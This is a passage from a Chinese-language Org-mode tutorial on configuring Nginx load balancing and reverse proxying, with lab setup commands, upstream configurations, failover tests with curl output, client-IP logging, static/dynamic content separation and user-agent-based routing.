    |-----------------------+----------------------------------------------------------------------|
    | weight                | 指定权重，默认是1。权重越大则被分配的请求越多。                      |
    |-----------------------+----------------------------------------------------------------------|
    | max_fails=2           | 最大尝试失败的次数，默认为1，0表示禁止失败尝试。企业场景：2-3次。    |
    |                       | 根据业务需求来设置。                                                 |
    |-----------------------+----------------------------------------------------------------------|
    | backup                | 热备配置（RS节点的高可用），当前面活动的RS都失败后会自动启用热备RS。 |
    |-----------------------+----------------------------------------------------------------------|
    | fail_timeout=20s      | 失败超时时间，默认是10秒。根据业务需求来配置，常规业务2-3秒较合理。  |
    |-----------------------+----------------------------------------------------------------------|
    | down                  | 这标志这服务器永不可用，这个参数一直配合ip_hash使用。                | 

	需要注意的地方：
	1. weight=number
	   #+BEGIN_EXAMPLE
	   设置该服务器的权重，默认值是1。这个数值越大，后端服务器就会被转发更多的请求。
	   注意，当负载调度算法为ip_hash时，后端服务器在负载均衡调度中的状态不能是
	   weight和backup。
	   #+END_EXAMPLE
	2. max_fails=number
	   #+BEGIN_EXAMPLE
	   Nginx尝试连接后端服务器的失败次数。这个数值是配合
       proxy_next_upstream，fastcgi_next_upstream和
       memcached_next_upstream这三个参数来使用的。当Nginx接收后端服务
       器返回这三个参数定义的状态码的时候，会将这个请求转发到正常工作的后端服务器
	   #+END_EXAMPLE
	3. fail_timeout=time
	   #+BEGIN_EXAMPLE
	   在max_fails定义的失败次数后，距离下次检查的时间间隔默认为10秒。
       如果max_fails是5，Nginx就检测5次，如果5次都是502错误，那么Nginx
       就会根据fail_timeout的值，等待10秒再去做检查。
	   #+END_EXAMPLE
	4. backup
	   #+BEGIN_EXAMPLE
	   这标志着这个后端服务器为备份服务器，当后端的主服务器全部宕机时，
       才会向该服务器转发请求；

	   当负载均衡算法为ip_hash时，后端服务器在负载均衡调度中的状态不能
       是weight和backup。
	   #+END_EXAMPLE
	5. down
	   #+BEGIN_EXAMPLE
	   这标志着该后端服务器永不可用，这个参数一直配合ip_hash使用。
	   #+END_EXAMPLE
	6. max_fails=5 fail_timeout=10s
	   #+BEGIN_EXAMPLE
	   重新加载Nginx配置，如果后端出现proxy_next_upstream中定义的错误
       （502），Nginx会根据max_fails的值去后端服务器检测，如果
       max_fails是5，它就检测5次，如果5次都是502，那么，Nginx就会根据
       fail_timeout的值，等待10秒再去检查一次，如果持续502错误，在不重
       新加载Nginx配置的情况下，每隔10秒都只检测一次。
	   #+END_EXAMPLE
	7. 特别说明
	   #+BEGIN_EXAMPLE
	   对于Nginx代理cache服务时，可能需要使用hash算法，此时，如果宕机
       时，可通过设置down参数确保客户端用户按照当前的hash算法访问，这
       点很重要。

	   upstream backend_pool {
	       ip_hash;
	       server backend1.lavenliu.com;
	       server backend2.lavenliu.com;
	       server backend3.lavenliu.com down;
	       server backend4.lavenliu.com;
	   }
	   #+END_EXAMPLE

	几个问题：
	#+BEGIN_EXAMPLE
	1. Nginx多长时间间隔检测服务器
	2. 
	#+END_EXAMPLE

	proxy_next_upstream参数说明：
	
*** 负载均衡方法
	The following load balancing mechanisms (or methods) are supported
	in nginx:
	+ round-robin
	  #+BEGIN_EXAMPLE
	  requests to the application servers are distributed in a
      round-robin fashion。按客户端请求顺序把客户端的请求逐一分配到不同的后端
	  服务器。如果后端服务器宕机（默认情况下只检测80端口，如果后端报502，
	  404，403，503等错误，还是会直接返回给用户），宕机服务器会被自动剔除，
	  使用户访问不受影响，请求会分配给正常的服务器。
	  #+END_EXAMPLE
	+ weight
	  #+BEGIN_EXAMPLE
	  在轮询算法的基础上加上权重（默认是rr+weight），权重轮询和访问成
      正比，权重越大，被转发的请求也就越多。可以根据服务器的配置和性能
      指定不同的权重值，这样可以有效地解决了新旧服务器性能不均进行请求
      分配问题。
	  #+END_EXAMPLE
	+ least-connected
	  #+BEGIN_EXAMPLE
	  next request is assigned to the server with the least number of
      active connections
	  #+END_EXAMPLE
	+ ip-hash
	  #+BEGIN_EXAMPLE
	  a hash-function is used to determine what server should be
      selected for the next request (based on the client’s IP address)

	  每个请求按访问IP的hash结果进行分配，当新的请求到达时，先将其客户
      端IP通过哈希算法计算出一个值，在后续的客户端请求中，如果客户端的
      IP哈希值相同，就会被分配至后端同一台服务器（LVS负载均衡的-p参数，
      keepalived配置里的persistence_timeout 50），该调度算法可以解决动
      态网页session共享问题，但有时会导致请求分配不均，即无法保证1:1的
      负载均衡。在国内所有的公司都是NAT模式上网，多个PC对应一个外部IP。
	  #+END_EXAMPLE
	+ fair（第三方）动态算法
	  #+BEGIN_EXAMPLE
	  按照后端服务器的响应时间来分配请求，响应时间短的优先分配。比上面
      两个更加智能的负载均衡算法。此算法可以根据页面大小和加载时间长短
      智能地进行负载均衡，也就是根据后端服务器的响应时间来分配请求，响
      应时间短的优先分配。Nginx本身不支持fair算法，如果需要使用这种调
      度算法，必须下载Nginx的upstream_fail模块。
	  #+END_EXAMPLE
	+ url_hash(第三方)
	  #+BEGIN_EXAMPLE
	  按访问url的hash结果来分配请求，让每个url定向到同一个后端服务器，
      后端服务器为缓存服务器时效果显著。在upstream中加入hash语句，
      server语句不能写入weight等其他参数，hash_method是使用的hash算法。

	  url_hash按访问URL的hash结果来分配请求，使每个URL定向到同一个后端
      服务器，可以进一步提高后端缓存服务器的命中率。Nginx本身不支持
      url_hash调度算法，如果要使用这种算法，必须安装Nginx的hash软件包。
	  #+END_EXAMPLE
	+ 一致性hash（tengine）
**** 默认的负载均衡配置
	 The simplest configuration for load balancing with nginx may look
	 like the following:
	 #+BEGIN_EXAMPLE
http {
    upstream myapp1 {
        server srv1.example.com;
        server srv2.example.com;
        server srv3.example.com;
    }

    server {
        listen 80;

        location / {
            proxy_pass http://myapp1;
        }
    }
}	 
	 #+END_EXAMPLE

	 In the example above, there are 3 instances of the same
	 application running on srv1-srv3. When the load balancing method
	 is not specifically configured, it defaults to round-robin. All
	 requests are proxied to the server group myapp1, and nginx
	 applies HTTP load balancing to distribute the requests.

	 Reverse proxy implementation in nginx includes load balancing for
	 HTTP, HTTPS, FastCGI, uwsgi, SCGI, and memcached.

	 To configure load balancing for HTTPS instead of HTTP, just use
	 "https" as the protocol.

	 When setting up load balancing for FastCGI, uwsgi, SCGI, or
	 memcached, use fastcgi_pass, uwsgi_pass, scgi_pass, and
	 memcached_pass directives respectively.
**** 最少连接的负载均衡配置
	 Another load balancing discipline is
	 least-connected. Least-connected allows controlling the load on
	 application instances more fairly in a situation when some of the
	 requests take longer to complete.

	 With the least-connected load balancing, nginx will try not to
	 overload a busy application server with excessive requests,
	 distributing the new requests to a less busy server instead.

	 Least-connected load balancing in nginx is activated when the
	 least_conn directive is used as part of the server group
	 configuration:
	 #+BEGIN_EXAMPLE
upstream myapp1 {
    least_conn;
    server srv1.example.com;
    server srv2.example.com;
    server srv3.example.com;
}	 
	 #+END_EXAMPLE
**** 回话保持
	 Please note that with round-robin or least-connected load
	 balancing, each subsequent client’s request can be potentially
	 distributed to a different server. There is no guarantee that the
	 same client will be always directed to the same server.

	 If there is the need to tie a client to a particular application
	 server — in other words, make the client's session "sticky" or
	 "persistent" in terms of always trying to select a particular
	 server — the ip-hash load balancing mechanism can be used.

	 With ip-hash, the client's IP address is used as a hashing key to
	 determine what server in a server group should be selected for
	 the client's requests. This method ensures that the requests from
	 the same client will always be directed to the same server except
	 when this server is unavailable.

	 To configure ip-hash load balancing, just add the ip_hash
	 directive to the server (upstream) group configuration:
	 #+BEGIN_EXAMPLE
upstream myapp1 {
    ip_hash;
    server srv1.example.com;
    server srv2.example.com;
    server srv3.example.com;
}	 
	 #+END_EXAMPLE
**** 基于权值的负载均衡配置
	 It is also possible to influence nginx load balancing algorithms
	 even further by using server weights.

	 In the examples above, the server weights are not configured
	 which means that all specified servers are treated as equally
	 qualified for a particular load balancing method.

	 With the round-robin in particular it also means a more or less
	 equal distribution of requests across the servers — provided
	 there are enough requests, and when the requests are processed in
	 a uniform manner and completed fast enough.

	 When the weight parameter is specified for a server, the weight
	 is accounted as part of the load balancing decision.
	 #+BEGIN_EXAMPLE
upstream myapp1 {
    server srv1.example.com weight=3;
    server srv2.example.com;
    server srv3.example.com;
}	 
	 #+END_EXAMPLE

	 With this configuration, every 5 new requests will be distributed
	 across the application instances as the following: 3 requests
	 will be directed to srv1, one request will go to srv2, and
	 another one — to srv3.

	 It is similarly possible to use weights with the least-connected
	 and ip-hash load balancing in the recent versions of nginx.
*** 集群状态健康检查
	Reverse proxy implementation in nginx includes in-band (or
	passive) server health checks. If the response from a particular
	server fails with an error, nginx will mark this server as failed,
	and will try to avoid selecting this server for subsequent inbound
	requests for a while.

	The max_fails directive sets the number of consecutive
	unsuccessful attempts to communicate with the server that should
	happen during fail_timeout. By default, max_fails is set
	to 1. When it is set to 0, health checks are disabled for this
	server. The fail_timeout parameter also defines how long the
	server will be marked as failed. After fail_timeout interval
	following the server failure, nginx will start to gracefully probe
	the server with the live client's requests. If the probes have
	been successful, the server is marked as a live one.
*** Nginx负载均衡实战
**** 环境准备
	 1. 机器准备
        | 主机名             |         IP地址 | 备注          |
        |--------------------+----------------+---------------|
        | lb01.lavenliu.com  | 192.168.20.150 | 主负载均衡器  |
        | lb02.lavenliu.com  | 192.168.20.151 | 备负载均衡器  |
        | web01.lavenliu.com | 192.168.20.152 | Real Server 1 |
        | web02.lavenliu.com | 192.168.20.153 | Real Server 2 | 

		修改主机名：
		#+BEGIN_SRC sh
        # vim /etc/sysconfig/network
		# hostname `awk -F= '/HOSTNAME/ { print $2 }' /etc/sysconfig/network`
		#+END_SRC
	 2. 安装软件包
		+ web端
		  #+BEGIN_SRC sh
yum install -y httpd
service httpd start
lsof -i:80
echo "192.168.20.152" > /var/www/html/index.html
curl http://192.168.20.152
		  #+END_SRC
		+ 负载均衡端
		  #+BEGIN_SRC sh
useradd -M -s /sbin/nologin nginx
yum install -y zlib-devel openssl-devel pcre-devel
cd /usr/local/src
wget http://nginx.org/download/nginx-1.9.1.tar.gz 
tar -xf nginx-1.9.1.tar.gz
cd nginx-1.9.1
./configure --user=nginx --group=nginx \
--prefix=/application/nginx-1.9.1 --with-http_stub_status_module \
--with-http_ssl_module --with-http_realip_module
make && make install
ln -s /application/nginx-1.9.1 /application/nginx
/application/nginx/sbin/nginx
lsof -i:80
curl http://192.168.20.150
		  #+END_SRC
**** Nginx负载均衡端配置及故障演练
	 #+BEGIN_EXAMPLE
cd /application/nginx/conf
egrep -v "#|^$" nginx.conf.default > nginx.conf
	 #+END_EXAMPLE

	 #+BEGIN_EXAMPLE
	 # 把下面的内容添加到http字段内，与server字段平行。
upstream web_pool {
	 ip_hash; # 如果启用了ip_hash，则backup功能将不能启用。这时权重也不起作用了。
	 server 192.168.20.152:80 weight=5;
	 server 192.168.20.153:80 weight=5;
	 server 192.168.20.154:80 weight=5 backup; # 上面两台web的热备，如果上面两台都宕机了，则开始接管服务
}

	 # 然后在server字段的location字段内，添加如下内容
	 proxy_pass http://web_pool;

	 # 一些指令的解释
	 # "server"是固定的，后面可以接域名（门户会用）或IP。如果不加端口，默认是80端口。
	 # weight代表权重，值越大则被分配的几率越高；
	 # 域名加端口。转发到后端的指定端口上；
	 # "server"如果接域名，需要内网有DNS服务器，或者在负载均衡器的hosts文件做
	 # 域名解析。"server"后面还可以直接跟IP或IP加端口；
	 #+END_EXAMPLE

	 检查Nginx配置语法，并重新reload
	 #+BEGIN_EXAMPLE
	 # /application/nginx/sbin/nginx -t
	 # /application/nginx/sbin/nginx -s reload
	 #+END_EXAMPLE
***** 多种场景故障演练
****** 权重相同
	   #+BEGIN_SRC sh
# 配置文件片段为
    upstream web_pool {
        server 192.168.20.152:80 weight=5;
        server 192.168.20.153:80 weight=5;
    }

    server {
        listen       80;
        server_name  www.lavenliu.com;
        location / {
            root   html;
            index  index.html index.htm;
            proxy_pass http://web_pool;
        }
        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }
    }

# 执行测试
# for i in {1..10} ; do curl http://192.168.20.150 ; done
192.168.20.152
192.168.20.153
192.168.20.152
192.168.20.153
192.168.20.152
192.168.20.153
192.168.20.152
192.168.20.153
192.168.20.152
192.168.20.153
	   #+END_SRC

	   从测试结果中可以发现，两台后端的WEB服务器权重值一样，说明是1:1的权
	   重，那么来自客户端的请求会被依次（均衡地）转发至后端WEB服务器上。
****** 权重不同
	   #+BEGIN_SRC sh
# 配置文件片段为
    upstream web_pool {
        server 192.168.20.152:80 weight=5;
        server 192.168.20.153:80 weight=10;
    }

    server {
        listen       80;
        server_name  www.lavenliu.com;
        location / {
            root   html;
            index  index.html index.htm;
            proxy_pass http://web_pool;
        }
        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }
    }

# 执行测试为
# for i in {1..15} ; do curl http://192.168.20.150 ; done
192.168.20.153
192.168.20.152
192.168.20.153
192.168.20.153
192.168.20.152
192.168.20.153
192.168.20.153
192.168.20.152
192.168.20.153
192.168.20.153
192.168.20.152
192.168.20.153
192.168.20.153
192.168.20.152
192.168.20.153
	   #+END_SRC

	   从测试结果中可以发现，两台后端的WEB服务器权重值分别为5和10，其
	   权重比值为1:2，其后端WEB服务器处理客户端的请求也基本符合1:2这样
	   的比值。这样设置不同的权重值，可以均衡新旧服务器的处理能力不同
	   的问题。
****** 启用ip_hash，关闭backup功能
	   #+BEGIN_SRC sh
# 配置文件片段为
    upstream web_pool {
        ip_hash;
        server 192.168.20.152:80 weight=5;
        server 192.168.20.153:80 weight=5;
#        server 192.168.20.154:80 weight=5 backup;
    }

    server {
        listen       80;
        server_name  www.lavenliu.com;
        location / {
            root   html;
            index  index.html index.htm;
            proxy_pass http://web_pool;
        }
        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }
    }

# 开始测试
# for i in {1..15} ; do curl http://192.168.20.150 ; done
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
	   #+END_SRC

	   从测试结果中可以发现，如果开启了ip_hash功能，来自同一客户端的请
	   求会被转发至后端同一台WEB服务器上。不过这时后端的WEB服务器不能
	   使用backup指令，不然，Nginx在检查配置语法时将不能通过。
****** 禁用ip_hash，关闭web1服务与开始web2的backup功能
	   #+BEGIN_SRC sh
# 配置文件片段为
    upstream web_pool {
#        ip_hash;
        server 192.168.20.152:80 weight=5;
        server 192.168.20.153:80 weight=5 backup;
#        server 192.168.20.154:80 weight=5 backup;
    }

    server {
        listen       80;
        server_name  www.lavenliu.com;
        location / {
            root   html;
            index  index.html index.htm;
            proxy_pass http://web_pool;
        }
        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }
    }

# 开始测试
web01# service httpd stop
# for i in {1..15} ; do curl http://192.168.20.150 ; done
192.168.20.153
192.168.20.153
192.168.20.153
192.168.20.153
192.168.20.153
192.168.20.153
192.168.20.153
192.168.20.153
192.168.20.153
192.168.20.153
192.168.20.153
192.168.20.153
192.168.20.153
192.168.20.153
192.168.20.153

# 然后，再次启用web01的服务
web01# service httpd start
# for i in {1..15} ; do curl http://192.168.20.150 ; done
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
	   #+END_SRC

	   从测试结果中可以发现，把后端web01服务器的httpd服务停止，把web02
	   设置为backup，可以发现，客户端的请求都会被转发至后端的web02这台
	   机器上；如果把web01的http服务重新启动，客户端再次来请求，则来自
	   客户端的请求又被转发至了web01这台服务器上了。
****** 禁用ip_hash，开启web01服务，开启web02的backup功能
	   #+BEGIN_SRC sh
# 配置文件片段为
    upstream web_pool {
#        ip_hash;
        server 192.168.20.152:80 weight=5;
        server 192.168.20.153:80 weight=5 backup;
#        server 192.168.20.154:80 weight=5 backup;
    }

    server {
        listen       80;
        server_name  www.lavenliu.com;
        location / {
            root   html;
            index  index.html index.htm;
            proxy_pass http://web_pool;
        }
        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }
    }

# 开始测试
# for i in {1..15} ; do curl http://192.168.20.150 ; done
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
192.168.20.152
	   #+END_SRC

	   从测试结果中可以发现，后端主WEB服务器为健康状态时，这时客户端的
	   请求，不会被转发至后端为backup标识的WEB服务器上。
****** 演示max_fails及fail_timeout的不同值
**** 反向代理核心模块原理
	 proxy_pass指令属于ngx_http_proxy_module模块，此模块可以将请求转发
	 至其他服务器上。Nginx的代理功能是通过http proxy模块实现的，默认在
	 安装Nginx时就已经安装了http proxy模块，因此可以直接使用http proxy
	 模块。

	 每个选项代表的含义：
     | 选项                       | 说明                                                  |
     |----------------------------+-------------------------------------------------------|
     | proxy_set_header           | 设置由后端的服务器获取用户的主机名或者真实IP地址，    |
     |                            | 以及代理者的真实IP地址                                |
     |----------------------------+-------------------------------------------------------|
     | client_body_buffer_size    | 用于指定客户端请求主体缓冲区大小，可以理解为先保存    |
     |                            | 到本地再传给用户                                      |
     |----------------------------+-------------------------------------------------------|
     | proxy_connect_timeout      | 表示与后端服务器连接的超时时间，即发起握手等候响应    |
     |                            | 的超时时间                                            |
     |----------------------------+-------------------------------------------------------|
     | proxy_send_timeout         | 表示后端服务器的数据回传时间，即在规定时间之内后端    |
     |                            | 服务器必须传完所有的数据，否则，Nginx将断开这个连接   |
     |----------------------------+-------------------------------------------------------|
     | proxy_read_timeout         | 设置Nginx从代理的后端服务器获取信息的时间，表示连接   |
     |                            | 建立成功后，Nginx等待后端服务器的响应时间             |
     |----------------------------+-------------------------------------------------------|
     | proxy_buffer_size          | 设置缓冲区大小，默认该缓冲区大小等于指令proxy_buffers |
     |                            | 设置的大小                                            |
     |----------------------------+-------------------------------------------------------|
     | proxy_buffers              | 设置缓冲区的数量和大小。Nginx从代理的后端服务器获取的 |
     |                            | 响应信息，会放置到缓冲区                              |
     |----------------------------+-------------------------------------------------------|
     | proxy_busy_buffers_size    | 用于设置系统繁忙时可以使用的proxy_buffers大小，官方   |
     |                            | 推荐的大小为proxy_buffers*2                           |
     |----------------------------+-------------------------------------------------------|
     | proxy_temp_file_write_size | 指定proxy缓存临时文件的大小                           |
**** 反向代理实战演练
	 配置文件里常用的参数，
	 #+BEGIN_EXAMPLE
proxy_redirect off;
proxy_set_header Host $host; # 在header中设置主机名信息，让不同的域名可以转发至后端不同的RS的虚拟主机
proxy_set_header X-Forwarded-For $remote_addr;
# proxy_set_header X-Real-IP $remote_addr;
# proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
proxy_connect_timeout 90;
proxy_send_timeout 90;
proxy_read_timeout 90;
proxy_buffer_size 4k;
proxy_buffers 4 32k;
proxy_busy_buffers_size 64k;
proxy_temp_file_write_size 64k;
	 #+END_EXAMPLE
***** proxy_set_header之多虚拟主机代理演练
	  proxy_pass参数说明：
      | 指令                                           | 说明                                            |
      |------------------------------------------------+-------------------------------------------------|
      | proxy_pass http://web_pool;                    | 用于指定反向代理的服务器池                      |
      |------------------------------------------------+-------------------------------------------------|
      | proxy_set_header Host $host                    | 当后端WEB服务器上也配置有多个虚拟主机时，需要用 |
      |                                                | 该header来区分反向代理哪个主机名                |
      |------------------------------------------------+-------------------------------------------------|
      | proxy_set_header X-Forwarded-For $remote_addr; | 如果后端WEB服务器上的程序需要获取用户IP，从该   |
      |                                                | header头获取                                    |
  
	  在后端的两台web服务器上设置两个基于域名的虚拟主机，
	  #+BEGIN_SRC sh
# mkdir /var/www/{bbs,www}
# echo bbs > /var/www/bbs/index.html
# echo www > /var/www/www/index.html
# cd /etc/httpd/conf
# vim httpd.conf
# 配置文件片段
NameVirtualHost *:80

<VirtualHost *:80>
    ServerAdmin ldczz@163.com
    DocumentRoot /var/www/bbs
    ServerName bbs.lavenliu.com
    ErrorLog logs/bbs-error_log
    CustomLog logs/bbs-access_log common
</VirtualHost>

<VirtualHost *:80>
    ServerAdmin ldczz@163.com
    DocumentRoot /var/www/www
    ServerName www.lavenliu.com
    ErrorLog logs/www-error_log
    CustomLog logs/www-access_log common
</VirtualHost>

# /etc/init.d/httpd configtest
# /etc/init.d/httpd graceful
# ======================================================================
# 在lb01端对web01进行测试
# cat /etc/hosts
192.168.20.152 www.lavenliu.com bbs.lavenliu.com
# for name in bbs www ; do curl ${name}.lavenliu.com ; done
bbs
www
# ======================================================================
# 在lb01端对web02进行测试
# cat /etc/hosts
192.168.20.153 www.lavenliu.com bbs.lavenliu.com
# for name in bbs www ; do curl ${name}.lavenliu.com ; done
bbs
www
	  #+END_SRC

	  以上的测试没有问题，都可以正常访问到bbs或www域名。现在通过Nginx
	  来进行访问，是不是也能得到正确结果呢？
	  #+BEGIN_SRC sh
# cat /etc/hosts
192.168.20.150 www.lavenliu.com bbs.lavenliu.com
# for name in bbs www ; do curl ${name}.lavenliu.com ; done
bbs
bbs
# 找到了web服务器的第一个虚拟主机bbs
	  #+END_SRC

	  从测试结果中，可以发现，通过Nginx代理访问，并不能得到我们想要的
	  结果。主要是Nginx在向后转发客户端的请求时，并没有携带来自客户端
	  请求头部，如“Host: www.lavenliu.com”或“bbs.lavenliu.com”，所以导
	  致测试结果不是我们所预期的。可以在Nginx代理端进行设置
	  proxy_set_header以期得到正确的结果，
	  #+BEGIN_SRC sh
# 配置文件片段
    server {
        listen       80;
        server_name  www.lavenliu.com;
        location / {
            root   html;
            index  index.html index.htm;
            proxy_pass http://web_pool;
            proxy_set_header Host $host; # 在这里进行设置，只设置了header携带主机名
        }
        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }
    }
# 检查配置语法
# /application/nginx/sbin/nginx -t
nginx: the configuration file /application/nginx-1.9.1/conf/nginx.conf syntax is ok
nginx: configuration file /application/nginx-1.9.1/conf/nginx.conf test is successful

# 重新加载Nginx配置文件
# /application/nginx/sbin/nginx -s reload

# 在lb01端再次进行测试
# for name in bbs www ; do curl ${name}.lavenliu.com ; done
bbs
www
	  #+END_SRC

	  当后端的Real Server分别为Apache或Nginx时的配置，
	  #+BEGIN_EXAMPLE
# 当RS为Nginx时，nginx.conf的配置
log_format	commonlog  '$remote_addr - $remote_user [$time_local] "$request" '
				       '$status $body_bytes_sent "$http_referer" '
				       '"$http_user_agent" "$http_x_forwarded_for"';
# 
# 当后端RS为Apache时，httpd.conf的配置
LogFormat "\"%{X-Forwarded-For}i\" %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\"" combined
	  #+END_EXAMPLE
***** 后端WEB记录客户端真实IP演练
	  一般情况下，后端WEB集群的访问日志里的IP信息都是来自代理端的IP，
	  而非客户端IP。如果后端WEB集群需要获取来自客户端的真实IP地址，则
	  还需要从proxy_set_header中获取。

	  设置lb01端的Nginx配置，
	  #+BEGIN_SRC sh
# 配置文件片段 - lb01之nginx.conf
    upstream web_pool {
#        ip_hash;
        server 192.168.20.152:80 weight=5;
        server 192.168.20.153:80 weight=5 backup;
#        server 192.168.20.154:80 weight=5 backup;
    }

    server {
        listen       80;
        server_name  www.lavenliu.com;
        location / {
            root   html;
            index  index.html index.htm;
            proxy_pass http://web_pool;
            proxy_set_header Host $host;
            proxy_set_header X-Forwarded-For $remote_addr;
        }
        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }
    }
	  #+END_SRC

	  有了以上配置，Nginx可以把来自客户端的IP地址转发到后端的WEB集群了，
	  但默认的Apache是不会接收Nginx传过来的IP地址的。所以，需要在
	  Apache上进行设置，
	  #+BEGIN_SRC sh
# 配置文件片段 - web01之httpd.conf
LogFormat "\"%{X-Forwarded-For}i\" %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\"" combined
#          ----------------------
#          ---- 增加了该参数 ----
<VirtualHost *:80>
    ServerAdmin ldczz@163.com
    DocumentRoot /var/www/www
    ServerName www.lavenliu.com
    ErrorLog logs/www-error_log
    CustomLog logs/www-access_log combined # 日志格式改为了combined
</VirtualHost>
# service httpd restart
# tail -f /etc/httpd/logs/www-access.log
192.168.20.150 - - [21/Feb/2016:15:07:55 +0800] "GET / HTTP/1.0" 200 4
192.168.20.150 - - [21/Feb/2016:15:07:56 +0800] "GET / HTTP/1.0" 200 4
"192.168.20.153" - - [21/Feb/2016:15:15:29 +0800] "GET / HTTP/1.0" 200 4 "-" "curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.14.0.0 zlib/1.2.3 libidn/1.18 libssh2/1.4.2"
"192.168.20.153" - - [21/Feb/2016:15:15:48 +0800] "GET / HTTP/1.0" 200 4 "-" "curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.14.0.0 zlib/1.2.3 libidn/1.18 libssh2/1.4.2"
# 可以看到，在web01上可以记录来自客户端的IP地址了
#
# 在web02上进行操作
# cat /etc/hosts
192.168.20.150 www.lavenliu.com bbs.lavenliu.com
# curl www.lavenliu.com
	  #+END_SRC
***** 反向代理之动静分离演练
	  演练环境：
      | 服务器             | 说明         |
      |--------------------+--------------|
      | web01.lavenliu.com | 为静态服务器 |
      | web02.lavenliu.com | 为动态服务器 | 

	  在开发人员无法通过程序实现动静分离的时候，运维人员可以根据资源实
	  体进行动静分离。
****** 通过目录实现动静分离演练
	   准备工作：
	   #+BEGIN_SRC sh
# 在lb01上进行操作：
# 配置文件片段 - nginx.conf
# process static requests
    upstream static_pool {
        server 192.168.20.152:80 weight=5;
    }

# process dynamic requests
    upstream dynamic_pool {
        server 192.168.20.153:80 weight=5;
    }

    server {
        listen       80;
        server_name  www.lavenliu.com;
        
        location / {
            root   html;
            index  index.html index.htm;
            proxy_pass http://dynamic_pool;
            include proxy.conf;
        }

        location /image/ {
            root   html;
            index  index.html index.htm;
            proxy_pass http://static_pool;
            include proxy.conf;
        }
        
        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }
    }
# --------------------
# web01上的操作：
# cd /var/www/www
# mkdir image
# rz emacs.png # 上传一张照片
# -------------------- 
# web02上的操作：
# cd /var/www/www
# mkdir dynamic
# echo dynamic153 > dynamic/index.html
# 在Windows客户端进行测试
# vi /c/Windows/System32/drivers/etc/hosts
192.168.20.150 www.lavenliu.com bbs.lavenliu.com
# 在Windows上的浏览器进行访问
# ping www.lavenliu.com
# http://www.lavenliu.com/image/emacs.png
# http://www.lavenliu.com/dynamic/index.html
	   #+END_SRC
****** 通过扩展名实现动静分离演练
	   在lb01上进行操作，（不用在其他机器上进行额外操作）：
	   #+BEGIN_SRC sh
# 配置文件片段 - nginx.conf
# process static requests
    upstream static_pool {
        server 192.168.20.152:80 weight=5;
    }

# process dynamic requests
    upstream dynamic_pool {
        server 192.168.20.153:80 weight=5;
    }

    server {
        listen       80;
        server_name  www.lavenliu.com;
        
        location / {
            root   html;
            index  index.html index.htm;
            proxy_pass http://dynamic_pool;
            include proxy.conf;
        }

        location ~ .*.(gif|jpg|jpeg|png|bmp|swf|css|js)$ {
            proxy_pass http://static_pool;
            include proxy.conf;
        }
        
        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }
    }
	   #+END_SRC

	   在Windows客户端进行测试：
	   #+BEGIN_SRC sh
# vi /c/Windows/System32/drivers/etc/hosts
# 192.168.20.150 www.lavenliu.com bbs.lavenliu.com
# 在浏览器里进行访问
# ping www.lavenliu.com
# http://www.lavenliu.com/image/emacs.png
# http://www.lavenliu.com/dynamic/index.html
# 停止lb01的WEB服务，再次进行访问，看是否有报错
# http://www.lavenliu.com/image/emacs.png
	   #+END_SRC
****** http_user_agent演练
	   应用场景：浏览器的判断，比如我们的程序不支持IE，可以针对客户端
	   的浏览器做判断，返回给客户端友好的提示信息。

	   在lb01上进行操作：
	   #+BEGIN_SRC sh
# 配置文件片段 - nginx.conf
# process static requests
    upstream static_pool {
        server 192.168.20.152:80 weight=5;
    }

# process dynamic requests
    upstream dynamic_pool {
        server 192.168.20.153:80 weight=5;
    }

    server {
        listen       80;
        server_name  www.lavenliu.com;
        
        location / {
            root   html;
            index  index.html index.htm;
            
            if ($http_user_agent ~* "MSIE") {
               proxy_pass http://dynamic_pool;   
            }

            if ($http_user_agent ~* "Firefox") {
               proxy_pass http://static_pool;
            }

            proxy_pass http://dynamic_pool; 
            include proxy.conf;
        }

        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }
    }
# 在web01上进行操作，设置test.html文件
# cd /var/www/www/
# echo "Firefox" > test.html
# 
# 在web02上进行操作，设置test.html文件
# cd /var/www/www/
# echo "Chrome" > test.html
#
# 在Windows客户端进行测试，分别使用Firefox和Chrome浏览器
# http://www.lavenliu.com/test.html
	   #+END_SRC

***** 反向代理移动端和PC端同域名分离访问演练
	  该功能的实现也是使用http_user_agent来实现的。对于移动端和PC端等
	  访问，都可以有很友好的呈现给用户。

	  #+BEGIN_SRC sh
# 配置文件片段 - lb01之nginx.conf
# process static requests
    upstream static_pool {
        server 192.168.20.152:80 weight=5;
    }

# process dynamic requests
    upstream dynamic_pool {
        server 192.168.20.153:80 weight=5;
    }

    server {
        listen       80;
        server_name  www.lavenliu.com;
        
        location / {
            root   html;
            index  index.html index.htm;
            
            if ($http_user_agent ~* "android") {
               proxy_pass http://dynamic_pool;   
            }

            if ($http_user_agent ~* "iphone") {
               proxy_pass http://static_pool;
            }

            proxy_pass http://dynamic_pool; 
            include proxy.conf;
        }

        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }
    }
